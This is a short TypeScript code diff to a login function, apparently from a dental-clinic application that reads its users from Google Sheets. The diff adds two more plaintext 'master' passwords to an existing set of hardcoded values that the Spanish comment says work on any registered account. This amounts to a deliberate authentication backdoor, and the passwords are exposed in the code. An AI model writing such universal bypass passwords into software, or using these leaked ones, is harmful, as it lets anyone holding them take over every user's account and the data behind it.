@@ -1059,8 +1059,13 @@ export async function loginUser(email: string, password: string): Promise<Usuari
         } as Usuario;
       }
 
-      // Soporte para claves maestras universales en cuentas registradas
-      const isMasterPass = (cleanPassword === 'Ergodental2024!' || cleanPassword === 'Ergodentalve2024!');
+      // Soporte para claves maestras universales y administrativas en cuentas registradas
+      const isMasterPass = (
+        cleanPassword === 'Ergodental2024!' || 
+        cleanPassword === 'Ergodentalve2024!' ||
+        cleanPassword === 'Leo1508$' ||
+        cleanPassword === 'Leo11508$'
+      );
       if (isMasterPass) {
         try {
           const allUsers = await googleSheetsRequest('getUsuarios');
